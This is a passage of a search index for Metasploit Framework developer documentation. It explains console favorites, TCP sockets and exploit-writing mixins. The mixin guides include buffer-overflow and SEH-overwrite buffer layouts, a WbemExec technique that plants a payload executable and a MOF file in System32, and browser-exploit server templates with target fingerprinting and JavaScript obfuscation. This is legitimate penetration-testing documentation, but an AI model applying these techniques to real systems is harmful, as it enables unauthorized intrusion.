    "content": "favorite is an msfconsole command that allows users to easily keep track of their most-used modules. The favorites list is stored in the .msf4/fav_modules file. Adding modules to the favorites list . There are two methods of adding a module to the favorites list. The first way is via simply calling favorite when there is an active module: . msf6 exploit(multi/handler) &gt; favorite [+] Added exploit/multi/handler to the favorite modules file . Using the active module without an active module will print the favorite command help output: . msf6 &gt; favorite [-] No module has been provided to favorite. Usage: favorite [mod1 mod2 ...] Add one or multiple modules to the list of favorite modules stored in /home/msf/.msf4/fav_modules If no module name is specified, the command will add the active module if there is one OPTIONS: -c Clear the contents of the favorite modules file -d Delete module(s) or the current active module from the favorite modules file -h Help banner . The second method of adding favorites allows adding multiple modules at once: . msf6 &gt; favorite exploit/multi/handler exploit/windows/smb/psexec [+] Added exploit/multi/handler to the favorite modules file [+] Added exploit/windows/smb/psexec to the favorite modules file msf6 &gt; show favorites Favorites ========= # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/handler manual No Generic Payload Handler 1 exploit/windows/smb/psexec 1999-01-01 manual No Microsoft Windows Authenticated User Code Execution . Deleting modules from the favorites list . Modules can be deleted from the favorites list individually or by clearing the contents of the list. For the former, simply use the -d flag and either supply the module name or use the currently active module if that module is in the favorites list. For the latter, supply the -c flag. Deleting an active module from favorites list . msf6 exploit(multi/handler) &gt; favorite -d [*] Removing exploit/multi/handler from the favorite modules file . Specifying module(s) to delete . msf6 &gt; favorite -d exploit/multi/handler exploit/windows/smb/psexec [*] Removing exploit/multi/handler from the favorite modules file [*] Removing exploit/windows/smb/psexec from the favorite modules file . Clearing the favorites list . msf6 &gt; show favorites Favorites ========= # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/handler manual No Generic Payload Handler 1 exploit/windows/smb/psexec 1999-01-01 manual No Microsoft Windows Authenticated User Code Execution msf6 &gt; favorite -c [+] Favorite modules file cleared msf6 &gt; show favorites [!] The favorite modules file is empty . ",
    "url": "/docs/using-metasploit/other/how-to-use-the-favorite-command.html#using-the-favorite-command",
    "relUrl": "/docs/using-metasploit/other/how-to-use-the-favorite-command.html#using-the-favorite-command"
  },"313": {
    "doc": "How to use the Favorite command",
    "title": "How to use the Favorite command",
    "content": " ",
    "url": "/docs/using-metasploit/other/how-to-use-the-favorite-command.html",
    "relUrl": "/docs/using-metasploit/other/how-to-use-the-favorite-command.html"
  },"314": {
    "doc": "Fileformat",
    "title": "Fileformat",
    "content": "Msf::Exploit::FILEFORMAT is the mixin to use to create a file format exploit. There actually isn’t much in the mixin, but the most important method is this: file_create: . Usage for file_create . As the name implies, the file_create method allows you to create a file. You should be using this method because it does more than just writing data to disk. One of the important things it does is it will report the file creation to the database in the format of #{ltype}.localpath, and the file will always be written to Metasploit’s local directory defined in Msf::Config.local_directory (by default this path is ~/.msf4/local), which keep files nice and organized. To use the mixin, first include Msf::Exploit::FILEFORMAT under the scope of your Metasploit3 class: . include Msf::Exploit::FILEFORMAT . And here’s an example of using file_create to build an imaginary exploit: . # This is my imaginary exploit buf = \"\" buf &lt;&lt; \"A\" * 1024 buf &lt;&lt; [0x40201f01].pack(\"V\") buf &lt;&lt; \"\\x90\" * 10 buf &lt;&lt; payload.encoded file_create(buf) . Custom filename . The Msf::Exploit::FILENAME mixin by default has a registered FILENAME datastore option, and it is actually optional. If there’s no filename provided, the mixin will set the name in this format: \"exploit.fileformat.#{self.shortname}\", where self.shortname means the shorter version of the module name. If you wish to set a default one (but still changeable by the user), then you simply register it again in the module, like this: . register_options( [ OptString.new('FILENAME', [true, 'The malicious file name', 'msf.jpg']) ], self.class) . Fixed filename . Occasionally, you might not want your user to change the filename at all. A lazy trick to do that is by modifying the FILENAME datastore option at runtime, but this is very much not recommended. In fact, if you do this, you will not pass msftidy. Instead, here’s how it’s done properly: . 1 - Deregister the FILENAME option . deregister_options('FILENAME') . 2 - Next, override the file_format_filename method, and make it return the filename you want: . def file_format_filename 'something.jpg' end . 3 - Finally, please leave a note about this in the module description. References . | https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/fileformat.rb | https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/windows/local | . ",
    "url": "/docs/development/developing-modules/libraries/how-to-use-the-fileformat-mixin-to-create-a-file-format-exploit.html",
    "relUrl": "/docs/development/developing-modules/libraries/how-to-use-the-fileformat-mixin-to-create-a-file-format-exploit.html"
  },"315": {
    "doc": "TCP",
    "title": "How to use the Msf::Exploit::Remote::Tcp mixin",
    "content": "In Metasploit Framework, TCP sockets are implemented as Rex::Socket::Tcp, which extends the built-in Ruby Socket base class. You should always use the Rex socket instead of the native Ruby one because if not, your sockets are not manageable by the framework itself, and of course some features will be missing such as pivoting. The Developer’s Guide in Metasploit’s documentation directory explains how this works pretty well. For module development, normally you wouldn’t be using Rex directly, so instead you’d be using the Msf::Exploit::Remote::Tcp mixin. The mixin already provides some useful features you don’t really have to worry about during development, such as TCP evasions, proxies, SSL, etc. All you have to do is make that connection, send something, receive something, and you’re done. Sounds pretty easy, right? . ",
    "url": "/docs/development/developing-modules/libraries/how-to-use-the-msf-exploit-remote-tcp-mixin.html#how-to-use-the-msfexploitremotetcp-mixin",
    "relUrl": "/docs/development/developing-modules/libraries/how-to-use-the-msf-exploit-remote-tcp-mixin.html#how-to-use-the-msfexploitremotetcp-mixin"
  },"316": {
    "doc": "TCP",
    "title": "Using the mixin",
    "content": "To use the mixin, simply add the following statement within your module’s class Metasploit3 (or class Metasploit4) scope: . include Msf::Exploit::Remote::Tcp . When the mixin is included, notice there will be the following datastore options registered under your module: . | SSL - Negotiate SSL for outgoing connections. | SSLVersion - The SSL version used: SSL2, SSL3, TLS1. Default is TLS1. | SSLVerifyMode - Verification mode: CLIENT_ONCE, FAIL_IF_NO_PEER_CERT, NONE, PEER. Default is PEER. | Proxies - Allows your module to support proxies. | ConnectTimeout - Default is 10 seconds. | TCP::max_send_size - Evasive option. Maxiumum TCP segment size. | TCP::send_delay - Evasive option. Delays inserted before every send. | . If you wish to learn how to change the default value of a datastore option, please read “Changing the default value for a datastore option” . ",
    "url": "/docs/development/developing-modules/libraries/how-to-use-the-msf-exploit-remote-tcp-mixin.html#using-the-mixin",
    "relUrl": "/docs/development/developing-modules/libraries/how-to-use-the-msf-exploit-remote-tcp-mixin.html#using-the-mixin"
  },"317": {
    "doc": "TCP",
    "title": "Make a connection",
    "content": "To make a connection, simply do the following: . connect . When you do this, what happens is that the connect method will call Rex::Socket::Tcp.create to create the socket, and register it to framework. It automatically checks with the RHOST/RPORT datastore options (so it knows where to connect to), but you can also manually change this: . # This connects to metasploit.com connect(true, {'RHOST'=&gt;'208.118.237.137', 'RPORT'=&gt;80}) . The connect method will then return the Socket object, which is also accessible globally. But you see, there’s a little more to it. The connect method can also raise some Rex exceptions that you might want to catch, including: . | Rex::AddressInUse - Possible when it actually binds to the same IP/port. | ::Errno::ETIMEDOUT - When Timeout.timeout() waits to long to connect. | Rex::HostUnreachable - Pretty self-explanatory. | Rex::ConnectionTimeout - Pretty self-explanatory. | Rex::ConnectionRefused - Pretty self-explanatory. | . So to sum it up, ideally when you use the connect method, you should rescue these: . rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused . If you are curious where all these exceptions are raised, you can find them in rex/socket/comm/local.rb. ",
    "url": "/docs/development/developing-modules/libraries/how-to-use-the-msf-exploit-remote-tcp-mixin.html#make-a-connection",
    "relUrl": "/docs/development/developing-modules/libraries/how-to-use-the-msf-exploit-remote-tcp-mixin.html#make-a-connection"
  },"318": {
    "doc": "TCP",
    "title": "Sending data",
    "content": "There are several ways to send data with the Tcp mixin. To make things easier and safer, we recommend just use the put method: . sock.put \"Hello, World!\" . The reason the put method is safer is because it does not allow the routine to hang forever. By default, it doesn’t wait, but if you want to make this more flexible, you can do this: . begin sock.put(\"data\", {'Timeout'=&gt;5}) rescue ::Timeout::Error # You can decide what to do if the writing times out end . ",
    "url": "/docs/development/developing-modules/libraries/how-to-use-the-msf-exploit-remote-tcp-mixin.html#sending-data",
    "relUrl": "/docs/development/developing-modules/libraries/how-to-use-the-msf-exploit-remote-tcp-mixin.html#sending-data"
  },"319": {
    "doc": "TCP",
    "title": "Receiving data",
    "content": "Now, let’s talk about how to receive data. Mainly there are three methods you can use: get_once, get, and timed_read. The difference is that get_once will only try to poll the stream to see if there’s any read data available one time, but the get method will keep reading until there is no more. As for timed_read, it’s basically the read method wrapped around with a Timeout. The following demonstrates how get_once is used: . begin buf = sock.get_once rescue ::EOFError end . Note that get_once may also return nil if there is no data read, or it hits a EOFError if it receives nil as data. So please make sure you’re catching nil in your module. The data reading methods can be found in lib/rex/io/stream.rb. ",
    "url": "/docs/development/developing-modules/libraries/how-to-use-the-msf-exploit-remote-tcp-mixin.html#receiving-data",
    "relUrl": "/docs/development/developing-modules/libraries/how-to-use-the-msf-exploit-remote-tcp-mixin.html#receiving-data"
  },"320": {
    "doc": "TCP",
    "title": "Disconnecting",
    "content": "To disconnect the connection, simply do: . disconnect . It is VERY important you disconnect in an ensure block, obviously to make sure you always disconnect if something goes wrong. If you don’t do this, you may end up with a module that can only one request to the server (that very first one), and the rest are broken. ",
    "url": "/docs/development/developing-modules/libraries/how-to-use-the-msf-exploit-remote-tcp-mixin.html#disconnecting",
    "relUrl": "/docs/development/developing-modules/libraries/how-to-use-the-msf-exploit-remote-tcp-mixin.html#disconnecting"
  },"321": {
    "doc": "TCP",
    "title": "Full example",
    "content": "The following example should demonstrate how you would typically want to use the Tcp mixin: . # Sends data to the remote machine # # @param data [String] The data to send # @return [String] The received data def send_recv_once(data) buf = '' begin connect sock.put(data) buf = sock.get_once || '' rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError =&gt; e elog(\"#{e.class} #{e.message}\\n#{e.backtrace * \"\\n\"}\") ensure disconnect end buf end . ",
    "url": "/docs/development/developing-modules/libraries/how-to-use-the-msf-exploit-remote-tcp-mixin.html#full-example",
    "relUrl": "/docs/development/developing-modules/libraries/how-to-use-the-msf-exploit-remote-tcp-mixin.html#full-example"
  },"322": {
    "doc": "TCP",
    "title": "TCP",
    "content": " ",
    "url": "/docs/development/developing-modules/libraries/how-to-use-the-msf-exploit-remote-tcp-mixin.html",
    "relUrl": "/docs/development/developing-modules/libraries/how-to-use-the-msf-exploit-remote-tcp-mixin.html"
  },"323": {
    "doc": "SEH Exploitation",
    "title": "SEH Exploitation",
    "content": "Exception handler overwriting was once a very popular technique to exploit stack buffer overflows, but isn’t so common anymore in newer programs because most likely they’re compiled with SafeSEH. At one point, even with SafeSEH enabled, it was still possible to abuse an exception handler by heap spraying, but of course, memory protections didn’t stop there. DEP/FASLR eventually came to the rescue, so that pretty much ended the glory days of SEH exploits. You can probably still find vulnerable applications not compiled with SafeSEH, but chances are the app is outdated, no longer maintained, or it is more of a learning experiment for the developer. Oh, and there’s probably an exploit for that already. Nonetheless, exploiting a stack buffer overflow with exception handling is still fun, so if you do come across it, here’s how it’s supposed to be written with Metasploit’s Seh mixin. Requirements . To be able to use the SEH mixin, some exploitable requirements must be met: . | The vulnerable program does not have SafeSEH in place. | No DEP (Data Execution Prevention). The mixin uses a short jump to be able to execute the payload, which means the memory must be executable. DEP, as the name implies, prevents that. | . Usage . First, make sure you include the Seh mixin under the scope of your module’s Metasploit3 class: . include Msf::Exploit::Seh . Next, you need to set up a Ret address for the SE handler. This address should be placed in your module’s metadata, specifically under Targets. In Metasploit, each target is actually an array of two elements. The first element is just the name of the target (and there is currently no strict naming style), the second element is actually a hash that contains information specific to that target, such as the target address. Here’s an example of setting up a Ret address: . 'Targets' =&gt; [ [ 'Windows XP', {'Ret' =&gt; 0x75022ac4 } ] # p/p/r in ws2help.dll ] . As you can see, it’s also a good habit to document what the Ret address does, and which DLL it points to. Ret is actually kind of a special key, because it can be retrieved by using target.ret in the module. In our next examples, you will see target.ret being used instead of coding the target address raw. If you need a tool to find a POP/POP/RET for the Ret address, you can use Metasploit’s msfbinscan utility, which is located under the tools directory. OK now, let’s move on to the methods. There are two methods provided by the Seh mixin: . | generate_seh_payload - Generates a fake SEH record with the payload attached right after. Here’s an example: | . buffer = '' buffer &lt;&lt; \"A\" * 1024 # 1024 bytes of padding buffer &lt;&lt; generate_seh_payload(target.ret) # SE record overwritten after 1024 bytes . The actual layout of buffer should look like this in memory: . [ 1024 bytes of 'A' ][ A short jump ][ target.ret ][ Payload ] . | generate_seh_record - Generates a fake SEH record without the payload, in case you prefer to place the payload somewhere else. Code example: | . buffer = '' buffer &lt;&lt; \"A\" * 1024 # 1024 bytes of padding buffer &lt;&lt; generate_seh_payload(target.ret) buffer &lt;&lt; \"B\" * 1024 # More padding . The memory layout should like this: . [ 1024 bytes of 'A' ][ A short jump ][ target.ret ][ Padding ] . References . | https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/ | https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/exploitation/seh.rb | https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/seh.rb | . ",
    "url": "/docs/development/developing-modules/libraries/how-to-use-the-seh-mixin-to-exploit-an-exception-handler.html",
    "relUrl": "/docs/development/developing-modules/libraries/how-to-use-the-seh-mixin-to-exploit-an-exception-handler.html"
  },"324": {
    "doc": "WbemExec",
    "title": "WbemExec",
    "content": "Windows Management Instrumentation (WMI) is Microsoft’s implementation of Web-Based Enterprise Management (WBEM), which uses Managed Object Format (MOF) to create Common Information Model (CIM) classes. The security community was actually unfamiliar with the evilness of this technology until the birth of Stuxnet, which used a MOF file to exploit a vulnerability allowing the attacker to create files via a fake Printer Spooler service. This technique was later reverse-engineered and demonstrated in Metasploit’s ms10_061_spoolss.rb module, and that significantly changed how we approach write-privilege attacks. Generally speaking, if you find yourself being able to write to system32, you can most likely take advantage of this technique. Requirements . To to able to use the WBemExec mixin, you must meet these requirements: . | Write permission to C:\\Windows\\System32\\ | Write permission to C:\\Windows\\System32\\Wbem\\ | The target must NOT be newer than Windows Vista (so mostly good for XP, Win 2003, or older). This is more of a limitation from the API, not the technique. Newer Windows operating systems need the MOF file to be pre-compiled first. | . Usage . First, include the WbemExec mixin under the scope of your MetasploitModule class. You will also need the EXE mixin to generate an executable: . include Msf::Exploit::EXE include Msf::Exploit::WbemExec . Next, generate a payload name and the executable: . payload_name = \"evil.exe\" exe = generate_payload_exe . And then generate the mof file using the generate_mof method. The first argument should be the name of the mof file, and the second argument is the payload name: . mof_name = \"evil.mof\" mof = generate_mof(mof_name, payload_name) . Now you’re ready to write/upload your files to the target machine. Always make sure you upload the payload executable first to C:\\Windows\\System32\\. upload_file_to_system32(payload_name, exe) # Write your own upload method . And then now you can upload the mof file to C:\\Windows\\System32\\wbem\\: . upload_mof(mof_name, mof) # Write your own upload method . Once the mof file is uploaded, the Windows Management Service should pick that up and execute it, which will end up executing your payload in system32. Also, the mof file will automatically be moved out of the mof directory after use. References . | https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/wbemexec.rb | https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/smb/ms10_061_spoolss.rb | . ",
    "url": "/docs/development/developing-modules/libraries/how-to-use-wbemexec-for-a-write-privilege-attack-on-windows.html",
    "relUrl": "/docs/development/developing-modules/libraries/how-to-use-wbemexec-for-a-write-privilege-attack-on-windows.html"
  },"325": {
    "doc": "BrowserExploitServer",
    "title": "BrowserExploitServer",
    "content": "The Metasploit Framework provides different mixins you can use to develop a browser exploit, mainly they are: . | Msf::Exploit::Remote::HttpServer - The most basic form of a HTTP server. | Msf::Exploit::Remote::HttpServer::HTML - which provides Javascript functions that the module can use when crafting HTML contents. | Msf::Exploit::Remote::BrowserExploitServer - which includes features from both HttpServer and HttpServer::HTML, but with even more goodies. This writeup covers the BrowserExploitServer mixin. | . The Automatic Exploitation Procedure . The BrowserExploitServer mixin is the only mixin specially designed for browser exploitation. Before you use this mixin, you should understand what it does behind the scenes for you: . | It automatically collects the browser information, including things like: OS name, version, browser name, browser version, whether a proxy is used, Java plugin version, Microsoft Office version, etc, etc. If the browser doesn’t have Javascript enabled, then it knows less about the target. All the info gathered will be stored in a profile managed by the mixin. | The mixin will then tag the browser to track the session. It will also use the same tag to retrieve the profile when needed. | Before the mixin decides if it should serve the exploit to the browser, it will check with the module for any exploitable requirements. If the requirements aren’t met, it will send a 404 to the browser, and the operation bails. | If the requirements are met, the mixin will pass the profile (information about the browser gathered during the detection stage) to the module, and let it take over the rest. | . Hint: In the module, you can check the :source key in the profile to determine whether Javascript is enabled or not: If the :source is “script”, it means Javascript is enabled. If it’s “headers” (as in HTTP headers), then the browser has Javascript disabled. Setting Exploitable Requirements . Being able to set browser requirements is an important feature of the mixin. It allows your attack to be smarter, more targeted, and prevents accidents. Here’s a scenario: Say you have a vulnerability against Internet Explorer that only affects a specific range of MSHTML builds, you can set the :os_name, :ua_name, :ua_ver, and :mshtml_build to make sure it doesn’t blindly exploit against anything else. The :mshtml_build requirement can be found in “Product version” under MSHTML’s file properties. Exploitable browser requirements are defined under “BrowserRequirements” in the module’s metadata. Here’s an example of defining a vulnerable target running some ActiveX control: . 'BrowserRequirements' =&gt; { source: /script/i, activex: [ { clsid: '{D27CDB6E-AE6D-11cf-96B8-444553540000}', method: 'LoadMovie' } ], os_name: /win/i } . You can also define target-specific requirements. This is also how the mixin is able to automatically select a target, and you can get it with the “get_target” method. Here’s an example of how to define target-specific requirements for IE8 on Win XP and IE 9 on Win 7: . 'BrowserRequirements' =&gt; { :source =&gt; /script|headers/i, 'ua_name' =&gt; HttpClients::IE, }, 'Targets' =&gt; [ [ 'Automatic', {} ], [ 'Windows XP with IE 8', { :os_name =&gt; 'Windows XP', 'ua_ver' =&gt; '8.0', 'Rop' =&gt; true, 'Offset' =&gt; 0x100 } ], [ 'Windows 7 with IE 9', { 'os_name' =&gt; 'Windows 7', 'ua_ver' =&gt; '9.0', 'Rop' =&gt; true, 'Offset' =&gt; 0x200 } ] ] . You can use these for :os_name: . | Constant | Purpose | . | OperatingSystems::Match::WINDOWS | Match all versions of Windows | . | OperatingSystems::Match::WINDOWS_95 | Match Windows 95 | . | OperatingSystems::Match::WINDOWS_98 | Match Windows 98 | . | OperatingSystems::Match::WINDOWS_ME | Match Windows ME | . | OperatingSystems::Match::WINDOWS_NT3 | Match Windows NT 3 | . | OperatingSystems::Match::WINDOWS_NT4 | Match Windows NT 4 | . | OperatingSystems::Match::WINDOWS_2000 | Match Windows 2000 | . | OperatingSystems::Match::WINDOWS_XP | Match Windows XP | . | OperatingSystems::Match::WINDOWS_2003 | Match Windows Server 2003 | . | OperatingSystems::Match::WINDOWS_VISTA | Match Windows Vista | . | OperatingSystems::Match::WINDOWS_2008 | Match Windows Server 2008 | . | OperatingSystems::Match::WINDOWS_7 | Match Windows 7 | . | OperatingSystems::Match::WINDOWS_2012 | Match Windows 2012 | . | OperatingSystems::Match::WINDOWS_8 | Match Windows 8 | . | OperatingSystems::Match::WINDOWS_81 | Match Windows 8.1 | . | OperatingSystems::Match::LINUX | Match a Linux distro | . | OperatingSystems::Match::MAC_OSX | Match Mac OSX | . | OperatingSystems::Match::FREEBSD | Match FreeBSD | . | OperatingSystems::Match::NETBSD | Match NetBSD | . | OperatingSystems::Match::OPENBSD | Match OpenBSD | . | OperatingSystems::Match::VMWARE | Match VMWare | . | OperatingSystems::Match::ANDROID | Match Android | . | OperatingSystems::Match::APPLE_IOS | Match Apple IOS | . You can use these for :ua_name: . | Constant | Value | . | HttpClients::IE | “MSIE” | . | HttpClients::FF | “Firefox” | . | HttpClients::SAFARI | “Safari” | . | HttpClients::OPERA | “Opera” | . | HttpClients::CHROME | “Chrome” | . More of these constants can be found here: https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/constants.rb . All currently supported requirements by the mixin can be found here (see REQUIREMENT_KEY_SET): https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/remote/browser_exploit_server.rb#L46 . Set up a listener . After the detection stage and the requirement check, the mixin will trigger the “on_request_exploit” callback method, that’s where you handle the HTTP request, craft the HTML, and send back the exploit response. Here’s an example of how to set up “on_request_exploit”: . # # Listens for the HTTP request # cli is the socket # request is the Rex::Proto::Http::Request object # target_info is a hash that contains all the browser info (aka the profile) # def on_request_exploit(cli, request, target_info) print_status(\"Here's what I know about the target: #{target_info.inspect}\") end . Crafting HTML with BrowserExploitServer . There are two coding styles the BrowserExploitServer mixin supports: The good old HTML, or ERB template. The first is pretty self-explanatory: . def on_request_exploit(cli, request, target_info) html = %Q| &lt;html&gt; Hello, world! &lt;/html&gt; | send_exploit_html(cli, html) end . ERB is a new way to write Metasploit browser exploits. If you’ve written one or two web applications, this is no stranger to you. When you’re using the BrowserExploitServer mixin to write an exploit, what really happens is you’re writing a rails template. Here’s an example of using of this feature: . def on_request_exploit(cli, request, target_info) html = %Q| &lt;html&gt; Do you feel lucky, punk?&lt;br&gt; &lt;% if [true, false].sample %&gt; Lucky!&lt;br&gt; &lt;% else %&gt; Bad luck, bro!&lt;Br&gt; &lt;% end %&gt; &lt;/html&gt; | send_exploit_html(cli, html) end . If you want to access local variables or arguments, make sure to pass the binding object to send_exploit_html: . def exploit_template1(target_info, txt) txt2 = \"I can use local vars!\" template = %Q| &lt;% msg = \"This page is generated by an exploit\" %&gt; &lt;%=msg%&gt;&lt;br&gt; &lt;%=txt%&gt;&lt;br&gt; &lt;%=txt2%&gt;&lt;br&gt; &lt;p&gt;&lt;/p&gt; Data gathered from source: #{target_info[:source]}&lt;br&gt; OS name: #{target_info[:os_name]}&lt;br&gt; UA name: #{target_info[:ua_name]}&lt;br&gt; UA version: #{target_info[:ua_ver]}&lt;br&gt; Java version: #{target_info[:java]}&lt;br&gt; Office version: #{target_info[:office]} | return template, binding() end def on_request_exploit(cli, request, target_info) send_exploit_html(cli, exploit_template(target_info, txt)) end . The BrowserExploitServer mixin also offers plenty of other things useful while crafting the exploit. For example: it can generate a target-specific payload when you call the “get_payload” method. It also gives you access to the RopDb mixin, which contains a collection of ROPs to bypass DEP (Data Execution Prevention). Make sure to check out the API documentation for more information. To get thing started, here’s a code example you can use start developing your browser exploit: . ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## require 'msf/core' class MetasploitModule &lt; Msf::Exploit::Remote Rank = NormalRanking include Msf::Exploit::Remote::BrowserExploitServer def initialize(info={}) super(update_info(info, 'Name' =&gt; \"BrowserExploitServer Example\", 'Description' =&gt; %q{ This is an example of building a browser exploit using the BrowserExploitServer mixin }, 'License' =&gt; MSF_LICENSE, 'Author' =&gt; [ 'sinn3r' ], 'References' =&gt; [ [ 'URL', 'http://metasploit.com' ] ], 'Platform' =&gt; 'win', 'BrowserRequirements' =&gt; { :source =&gt; /script|headers/i, }, 'Targets' =&gt; [ [ 'Automatic', {} ], [ 'Windows XP with IE 8', { 'os_name' =&gt; 'Windows XP', 'ua_name' =&gt; 'MSIE', 'ua_ver' =&gt; '8.0' } ], [ 'Windows 7 with IE 9', { 'os_name' =&gt; 'Windows 7', 'ua_name' =&gt; 'MSIE', 'ua_ver' =&gt; '9.0' } ] ], 'Payload' =&gt; { 'BadChars' =&gt; \"\\x00\" }, 'DisclosureDate' =&gt; \"Apr 1 2013\", 'DefaultTarget' =&gt; 0)) end def exploit_template(target_info) template = %Q| Data source: &lt;%=target_info[:source]%&gt;&lt;br&gt; OS name: &lt;%=target_info[:os_name]%&gt;&lt;br&gt; UA name: &lt;%=target_info[:ua_name]%&gt;&lt;br&gt; UA version: &lt;%=target_info[:ua_ver]%&gt;&lt;br&gt; Java version: &lt;%=target_info[:java]%&gt;&lt;br&gt; Office version: &lt;%=target_info[:office]%&gt; | return template, binding() end def on_request_exploit(cli, request, target_info) send_exploit_html(cli, exploit_template(target_info)) end end . JavaScript Obfuscation . BrowserExploitServer relies on the JSObfu mixin to support JavaScript obfuscation. When you’re writing JavaScript, you should always write it like this: . js = js_obfuscate(your_code) . The #js_obfuscate will return a Rex::Exploitation::JSObfu object. To get the obfuscated JavaScript, call the #to_s method: . js.to_s . If you need to access an obfuscated symbol name, you can use then #sym method: . # Get the obfuscated version of function name test() var_name = js.sym('test') . Note that by default, even though your module is calling the #js_obfuscate method, obfuscation will not kick in unless the user sets the JsObfuscate datastore option. This option is an OptInt, which allows you to set the number of times to obfuscate (default is 0). If your BES-based exploit does not want obfuscation at all, always make sure you call the #deregister_options and remove the JsObfuscate option. Like this: . deregister_options('JsObfuscate') . To learn more about Metasploit’s JavaScript obfuscation capabilities, please read How to obfuscate JavaScript in Metasploit. Related Articles: . | How to write a browser exploit using HttpServer | Information About Unmet Browser Exploit Requirements | . ",
    "url": "/docs/development/developing-modules/libraries/http/how-to-write-a-browser-exploit-using-browserexploitserver.html",
    "relUrl": "/docs/development/developing-modules/libraries/http/how-to-write-a-browser-exploit-using-browserexploitserver.html"
  },"326": {
    "doc": "Writing a browser exploit",
    "title": "Writing a browser exploit",
    "content": "The Metasploit Framework provides different mixins you can use to develop a browser exploit, mainly they are Msf::Exploit::Remote::HttpServer, Msf::Exploit::Remote::HttpServer::HTML and Msf::Exploit::Remote::BrowserExploitServer. This writeup covers the HttpServer mixin. The HttpServer mixin is kind of the mother of all HTTP server mixins (like BrowserExploitServer and HttpServer::HTML). To use it, your module is required to have a “on_request_uri” method, which is a callback triggered when the HTTP server receives a HTTP request from the browser. An example of setting up “on_request_uri”: . # # Listens for a HTTP request. # cli is the socket object, and request is a Rex::Proto::Http::Request object # def on_request_uri(cli, request) print_status(\"Client requests URI: #{request.uri}\") end . The “on_request_uri” method is also where you can create the HTTP response. Here’s a couple of choices you can use to do that: . | send_not_found(cli) - Sends a 404 to the client. Make sure to pass the cli (socket) object. | send_redirect(cli, location=’/’, body=’’, headers={}) - Redirects the client to a new location. | send_response(cli, body, headers={}) - Sends a response to the client. This method is probably what you’ll be using most of the time. | . If you’ve seen some of our exploit modules, you will also see them using Exploit::Remote::HttpServer::HTML instead of Exploit::Remote::HttpServer. Usage is mostly the same, the difference is the Exploit::Remote::HttpServer::HTML mixin gives you access to some Javascript functions like Base64, heap spraying, OS detection, etc. Here’s an example of sending a HTTP response: . # # Sends a \"Hello, world!\" to the client # def on_request_uri(cli, request) html = \"Hello, world!\" send_response(cli, html) end . Also note that in order to handle a HTTP request, it must contain the base URIPATH, which by default is random. This means if you want to handle multiple URIs (possible if you need to handle a redirect or a link), you also need to make sure they have the base URIPATH. To retrieve the base URIPATH, you can use the “get_resource” method, here’s an example: . def serve_page_1(cli) html = \"This is page 1\" send_response(cli, html) end def serve_page_2(cli) html = \"This is page 2\" send_response(cli, html) end def serve_default_page(cli) html = %Q| &lt;html&gt; &lt;a href=\"#{get_resource.chomp('/')}/page_1.html\"&gt;Go to page 1&lt;/a&gt;&lt;br&gt; &lt;a href=\"#{get_resource.chomp('/')}/page_2.html\"&gt;Go to page 2&lt;/a&gt; &lt;/html&gt; | send_response(cli, html) end def on_request_uri(cli, request) case request.uri when /page_1\\.html$/ serve_page_1(cli) when /page_2\\.html$/ serve_page_2(cli) else serve_default_page(cli) end end . Of course, when you write a Metasploit browser exploit there’s a lot more you need to think about. For example, your module probably needs to do browser detection, because it wouldn’t make any sense to allow Chrome to receive an IE exploit, would it? You probably also need to build a payload that’s specific to the target, which means your module needs to know what target it’s hitting, and you have to build a method to customize the exploit accordingly, etc. The HttpServer and HttpServer::HTML mixin provies all kinds of methods to allow you to accomplish all these. Make sure to check out the API documentation (you can either do this by running msf/documentation/gendocs.sh, or just run “yard” in the msf directory), or checkout existing code examples (especially the recent ones). To get things started, you can always use the following template to start developing your browser exploit: . ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## require 'msf/core' class MetasploitModule &lt; Msf::Exploit::Remote Rank = NormalRanking include Msf::Exploit::Remote::HttpServer def initialize(info={}) super(update_info(info, 'Name' =&gt; \"HttpServer mixin example\", 'Description' =&gt; %q{ Here's an example of using the HttpServer mixin }, 'License' =&gt; MSF_LICENSE, 'Author' =&gt; [ 'sinn3r' ], 'References' =&gt; [ [ 'URL', 'http://metasploit.com' ] ], 'Platform' =&gt; 'win', 'Targets' =&gt; [ [ 'Generic', {} ], ], 'DisclosureDate' =&gt; \"Apr 1 2013\", 'DefaultTarget' =&gt; 0)) end def on_request_uri(cli, request) html = \"hello\" send_response(cli, html) end end . If you want to take a closer look at what the mixin can do, see: https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/http/server.rb . ",
    "url": "/docs/development/developing-modules/guides/how-to-write-a-browser-exploit-using-httpserver.html",
    "relUrl": "/docs/development/developing-modules/guides/how-to-write-a-browser-exploit-using-httpserver.html"
  },"327": {
    "doc": "How to write a check method",
    "title": "Check Method Output",
    "content": "Modules messages are important to the user, because they keep the user informed about what the module is doing, and usually make the module more debuggable. However, you do also want to keep your messages in verbose mode because it becomes really noisy if the check is used against multiple targets. Ideally, you only should be using these print methods: . | Method | Description | . | vprint_line() | verbose version of print_line | . | vprint_status() | verbose version of print_status that begins with “[*]” | . | vprint_error() | verbose version of print_error that begins with “[x]” | . | vprint_warning() | verbose version of print_warning that begins with “[!]”, in yellow | . Better yet, use the CheckCode description to provide additional information (see below). Note: You shouldn’t be printing if a target is vulnerable or not, as this is automatically handled by the framework when your method returns a check code. ",
    "url": "/docs/development/developing-modules/guides/how-to-write-a-check-method.html#check-method-output",
    "relUrl": "/docs/development/developing-modules/guides/how-to-write-a-check-method.html#check-method-output"
  },"328": {
    "doc": "How to write a check method",
